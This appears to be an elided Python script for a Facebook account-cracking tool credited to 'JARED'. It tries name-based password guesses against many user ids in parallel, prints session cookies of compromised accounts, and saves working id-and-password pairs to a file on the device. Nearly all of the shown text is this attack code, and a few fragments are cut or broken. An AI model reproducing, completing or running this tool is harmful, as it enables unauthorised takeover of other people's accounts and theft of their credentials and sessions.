...
-------------------------------------------------
\033[1;32m ᴀᴜᴛʜᴏʀ    : JARED
\033[1;32mᴠᴇʀsɪᴏɴ    : 0.01
\033[1;32m ғᴀᴄᴇʙᴏᴏᴋ  : JARED
\033[1;32mᴛᴏᴏʟ sᴛᴀᴛᴜs : ғʀᴇᴇ
------------------------------------------------"""
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\033[1;33m [JARED-OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\033[1;32m [JARED-CP] ' +cid+ ' • ' +ps+           '  \33[0;97m')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\033[1;33m [JARED-OK] '+str(ids)+' | '+pas+'\033[1;97m')
...
def file2():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;37m misskonasya;)))) \033[1;37m")
			linex()
			for user in fo:
...
def ffb1(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [JARED-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m | \033[1;31mDEAD \033[1;32m%s\033[0m (loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
            ...
            if 'session_key' in req:
                print('01615161056[ALIVE] '+ids+'|'+pas+'\n')
                open('/sdcard/JARED-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                oks.append(ids)
                break
